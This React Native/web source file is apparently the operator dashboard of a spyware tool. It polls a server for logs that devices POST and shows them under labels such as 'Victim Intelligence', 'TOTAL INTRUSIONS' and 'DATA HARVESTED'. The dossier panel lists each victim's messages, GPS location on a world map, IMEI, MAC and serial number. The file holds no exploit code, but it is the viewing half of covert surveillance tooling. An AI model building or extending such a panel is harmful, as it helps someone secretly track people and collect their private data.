import React, { useEffect, useState, useRef } from 'react';
import { View, Text, FlatList, StyleSheet, TouchableOpacity, Animated, Dimensions, ScrollView, Image, Platform } from 'react-native';
import { ComposableMap, Geographies, Geography, Marker } from 'react-simple-maps';

const { width } = Dimensions.get('window');
const MAP_WIDTH = Math.min(1000, width - 80);
const MAP_HEIGHT = Math.round(MAP_WIDTH / 2);

// Helper: equirectangular projection (approx)
const latLonToXY = (lat, lon, w = MAP_WIDTH, h = MAP_HEIGHT) => {
  const x = ((lon + 180) / 360) * w;
  const y = ((90 - lat) / 180) * h;
  return { x, y };
};

const NeonMetric = ({ title, value, color }) => (
  <View style={[styles.metricCard, { borderColor: color, shadowColor: color }]}> 
    <Text style={styles.metricTitle}>{title}</Text>
    <Text style={[styles.metricValue, { color }]}>{value}</Text>
  </View>
);

const PulseMarker = ({ x, y }) => {
  const scale = useRef(new Animated.Value(0)).current;
  useEffect(() => {
    Animated.loop(
      Animated.sequence([
        Animated.timing(scale, { toValue: 1, duration: 1200, useNativeDriver: true }),
        Animated.timing(scale, { toValue: 0, duration: 1200, useNativeDriver: true }),
      ])
    ).start();
  }, []);

  return (
    <Animated.View style={[styles.marker, { left: x - 8, top: y - 8, transform: [{ scale }] }]} />
  );
};

const WebDashboard = () => {
  const [logs, setLogs] = useState([]);
  const [consoleLines, setConsoleLines] = useState([]);
  const [selected, setSelected] = useState(null);
  const slideAnim = useRef(new Animated.Value(1)).current; // 1 => hidden, 0 => visible

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch('/get-logs');
        if (!response.ok) throw new Error(`Status ${response.status}`);
        const data = await response.json();
        setLogs(data);
        setConsoleLines(prev => [`Fetched ${data.length} logs at ${new Date().toLocaleTimeString()}`, ...prev].slice(0, 200));
      } catch (err) {
        setConsoleLines(prev => [`Fetch error: ${err.message} - ${new Date().toLocaleTimeString()}`, ...prev].slice(0, 200));
      }
    };

    fetchData();
    const id = setInterval(fetchData, 3000);
    return () => clearInterval(id);
  }, []);

  const openDossier = (item) => {
    setSelected(item);
    Animated.timing(slideAnim, { toValue: 0, duration: 350, useNativeDriver: true }).start();
  };
  const closeDossier = () => {
    Animated.timing(slideAnim, { toValue: 1, duration: 250, useNativeDriver: true }).start(() => setSelected(null));
  };

  // Metrics derived from logs (simple counts / dummies)
  const total = logs.length;
  const live = logs.filter(l => l.location && l.location !== 'Disabled').length;
  const vpn = Math.floor(Math.random() * 10); // placeholder
  const harvested = (logs.reduce((s, l) => s + (l.message ? l.message.length : 0), 0));

  // Map markers - logs with location
  const markers = logs
    .map(l => ({ ...l, coords: (l.location && l.location !== 'Disabled') ? l.location.split(',').map(s => Number(s.trim())) : null }))
    .filter(l => l.coords && l.coords.length === 2)
    .map(l => ({ id: l.id, lat: l.coords[0], lon: l.coords[1], item: l }));

  // static sample markers (India, USA, Japan)
  const staticMarkers = [
    { id: 'india', lat: 20.5937, lon: 78.9629 },
    { id: 'usa', lat: 37.0902, lon: -95.7129 },
    { id: 'japan', lat: 36.2048, lon: 138.2529 },
  ];

  return (
    <View style={styles.container}>
      <View style={styles.topbar}>
        <Text style={styles.title}>Tiger V2 Forensic Hub - Admin Dashboard</Text>
        <View style={styles.topInfo}>
          <Text style={styles.status}>SYSTEM STATUS: <Text style={{color:'#00ff41'}}>ONLINE</Text></Text>
          <Text style={styles.info}>LIVE NODES: <Text style={{color:'#00ff41'}}>{live}</Text></Text>
          <View style={styles.roleBadge}><Text style={{color:'#000', fontWeight:'bold'}}>SUPER_ADMIN</Text></View>
        </View>
      </View>

      <View style={{display:'flex', flexDirection:'row', gap:20}}>
        {/* Sidebar */}
        <View style={styles.sidebar}>
          <Text style={styles.sidebarItem}>🏠 Dashboard</Text>
          <Text style={styles.sidebarItem}>🎯 Targets</Text>
          <Text style={styles.sidebarItem}>🔒 File Vault</Text>
          <Text style={styles.sidebarItem}>⚙️ Settings</Text>
        </View>

        <View style={{flex:1}}>
          <View style={styles.metricsRow}>
            <NeonMetric title="TOTAL INTRUSIONS" value={total} color="#00ff41" />
            <NeonMetric title="LIVE CONNECTIONS" value={live} color="#00ff41" />
            <NeonMetric title="VPN/PROXY HITS" value={vpn} color="#ff6b00" />
            <NeonMetric title="DATA HARVESTED" value={`${harvested} B`} color="#00ff41" />
          </View>

          <View style={styles.mainRow}>
            <View style={styles.mapCard}>
              <Text style={styles.cardTitle}>Global Targets</Text>
              <Text style={styles.cardSub}>Realtime map with pulsing alerts</Text>

              {/* Web map using react-simple-maps (only on web) */}
              {typeof window !== 'undefined' ? (
                <div style={{ width: MAP_WIDTH, height: MAP_HEIGHT }}>
                  <ComposableMap projectionConfig={{ scale: 140 }} width={MAP_WIDTH} height={MAP_HEIGHT}>
                    <Geographies geography={'https://unpkg.com/world-atlas@2.0.2/world/110m.json'}>
                      {({ geographies }) => geographies.map(geo => (
                        <Geography key={geo.rsmKey} geography={geo} fill={'rgba(255,255,255,0.02)'} stroke={'#0b0d0f'} />
                      ))}
                    </Geographies>

                    {staticMarkers.map(m => (
                      <Marker key={m.id} coordinates={[m.lon, m.lat]}>
                        <g>
                          <circle r={6} fill="#ff2b2b">
                            <animate attributeName="r" values="6;14;6" dur="1.6s" repeatCount="indefinite" />
                            <animate attributeName="opacity" values="1;0.3;1" dur="1.6s" repeatCount="indefinite" />
                          </circle>
                        </g>
                      </Marker>
                    ))}

                    {markers.map(m => (
                      <Marker key={m.id} coordinates={[m.lon, m.lat]}>
                        <g>
                          <circle r={5} fill="#ff2b2b" />
                          <circle r={9} fill="none" stroke="#ff6b00" strokeWidth={2} opacity={0.8}>
                            <animate attributeName="r" values="9;18;9" dur="1.6s" repeatCount="indefinite" />
                            <animate attributeName="opacity" values="0.8;0.2;0.8" dur="1.6s" repeatCount="indefinite" />
                          </circle>
                        </g>
                      </Marker>
                    ))}

                  </ComposableMap>
                </div>
              ) : (
                <Image source={{ uri: 'https://upload.wikimedia.org/wikipedia/commons/8/80/World_map_-_low_resolution.svg' }} style={{ width: MAP_WIDTH, height: MAP_HEIGHT, borderRadius: 8 }} />
              )}

            </View>

            <View style={styles.tableCard}>
              <Text style={styles.cardTitle}>Victim Intelligence</Text>
              <ScrollView style={{ maxHeight: MAP_HEIGHT }}>
                <View style={styles.tableHeader}>
                  <Text style={styles.th}>Case ID</Text>
                  <Text style={styles.th}>Device</Text>
                  <Text style={styles.th}>IP</Text>
                  <Text style={styles.th}>Battery</Text>
                  <Text style={styles.th}>Action</Text>
                </View>

                {logs.map((item) => (
                  <View key={item.id} style={styles.row}>
                    <Text style={styles.td}>{item.id}</Text>
                    <Text style={styles.td}>{item.device}</Text>
                    <Text style={styles.td}>{item.sender || '—'}</Text>
                    <Text style={styles.td}>{Math.floor(Math.random()*100)}%</Text>
                    <TouchableOpacity style={styles.viewBtn} onPress={() => openDossier(item)}>
                      <Text style={{color:'#000', fontWeight:'bold'}}>View Dossier</Text>
                    </TouchableOpacity>
                  </View>
                ))}

                {logs.length === 0 && <Text style={{color:'#888', padding:20}}>No logs yet — waiting for device POSTs.</Text>}
              </ScrollView>
            </View>
          </View>

          {/* Bottom console strip */}
          <View style={styles.consoleStrip}>
            <ScrollView horizontal showsHorizontalScrollIndicator={false}>
              {consoleLines.map((c, i) => (
                <Text key={i} style={styles.consoleLine}>{c}</Text>
              ))}
            </ScrollView>
          </View>

          {/* Dossier slide-over */}
          {selected && (
            <Animated.View style={[styles.slideOver, { transform: [{ translateX: slideAnim.interpolate({ inputRange: [0,1], outputRange: [0, 600] }) }] }]}>
              <View style={styles.dossierHeader}>
                <Text style={{fontSize:18, fontWeight:'bold'}}>{selected.device} — Case {selected.id}</Text>
                <TouchableOpacity onPress={closeDossier}><Text style={{color:'#ff6b00'}}>Close</Text></TouchableOpacity>
              </View>

              <ScrollView style={{padding:20}}>
                <Text style={styles.secTitle}>Summary</Text>
                <Text>Sender: {selected.sender}</Text>
                <Text>Message: {selected.message}</Text>
                <Text>Time: {selected.time || selected.timestamp}</Text>
                <Text>Location: {selected.location}</Text>

                <Text style={styles.secTitle}>Hardware & Identifiers</Text>
                <Text>IMEI: {selected.imei || '—'}</Text>
                <Text>MAC: {selected.mac || '—'}</Text>
                <Text>Serial: {selected.serial || '—'}</Text>

                <Text style={styles.secTitle}>Contacts / Media</Text>
                <Text>Contacts: (placeholder)</Text>
                <View style={{height:120, backgroundColor:'#0b0d0f', borderRadius:8, marginTop:8, justifyContent:'center', alignItems:'center'}}>
                  <Text style={{color:'#666'}}>Media placeholders</Text>
                </View>
              </ScrollView>
            </Animated.View>
          )}

          <View style={styles.footNote}><Text style={{color:'#888'}}>Authorized Access Only | Sec Level 99</Text></View>
        </View>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, padding: 28, backgroundColor: '#05070a', fontFamily: 'JetBrains Mono, monospace' },
  topbar: { display: 'flex', flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 },
  title: { color: '#00ff41', fontSize: 20, fontWeight: 'bold' },
  topInfo: { display: 'flex', flexDirection: 'row', gap: 16, alignItems: 'center' },
  status: { color: '#fff', marginRight: 10 },
  info: { color: '#fff' },
  roleBadge: { backgroundColor: '#00ff41', padding: 6, borderRadius: 6 },

  metricsRow: { display: 'flex', flexDirection: 'row', gap: 16, marginBottom: 20 },
  metricCard: { flex: 1, padding: 18, backgroundColor: 'rgba(0,0,0,0.35)', borderRadius: 12, borderWidth: 1, borderColor: 'rgba(0,255,65,0.12)', boxShadow: '0 6px 30px rgba(0,255,65,0.06)' },
  metricTitle: { color: '#9fbf9f', fontSize: 12 },
  metricValue: { fontSize: 22, fontWeight: 'bold' },

  mainRow: { display: 'flex', flexDirection: 'row', gap: 20 },
  mapCard: { flex: 2, padding: 16, backgroundColor: 'rgba(255,255,255,0.02)', borderRadius: 12, overflow: 'hidden' },
  tableCard: { flex: 1, padding: 16, backgroundColor: 'rgba(255,255,255,0.02)', borderRadius: 12, overflow: 'hidden' },
  cardTitle: { color: '#00ff41', fontWeight: 'bold', fontSize: 16 },
  cardSub: { color: '#888', fontSize: 12 },

  sidebar: { width: 120, padding: 12, backgroundColor: 'rgba(255,255,255,0.01)', borderRadius: 8, marginRight: 12 },
  sidebarItem: { color: '#00ff41', paddingVertical: 12, fontSize: 14 },

  marker: { position: 'absolute', width: 16, height: 16, borderRadius: 8, backgroundColor: '#ff2b2b', opacity: 0.85, borderWidth: 2, borderColor: '#ff6b00' },

  tableHeader: { display: 'flex', flexDirection: 'row', justifyContent: 'space-between', paddingVertical: 10, borderBottomWidth: 1, borderColor: '#222' },
  th: { color: '#00ff41', width: '20%', fontWeight: 'bold', fontSize: 12 },
  row: { display: 'flex', flexDirection: 'row', justifyContent: 'space-between', paddingVertical: 12, borderBottomWidth: 1, borderColor: '#101214' },
  td: { color: '#fff', width: '20%', fontSize: 13 },
  viewBtn: { backgroundColor: '#00ff41', paddingHorizontal: 8, paddingVertical: 6, borderRadius: 6 },

  consoleStrip: { marginTop: 18, padding: 12, backgroundColor: '#020203', borderRadius: 8, borderWidth:1, borderColor:'#0b660f' },
  consoleLine: { color: '#00ff41', marginRight: 20, fontFamily: 'JetBrains Mono' },

  slideOver: { position: 'fixed', right: 0, top: 80, width: 560, bottom: 40, backgroundColor: '#08090b', borderLeftWidth: 1, borderColor: '#222', zIndex: 1000 },
  dossierHeader: { padding: 12, borderBottomWidth: 1, borderColor: '#111', display: 'flex', flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center' },
  secTitle: { color: '#00ff41', marginTop: 12, marginBottom: 6, fontWeight: 'bold' },

  footNote: { marginTop: 10, textAlign: 'center' }
});

export default WebDashboard;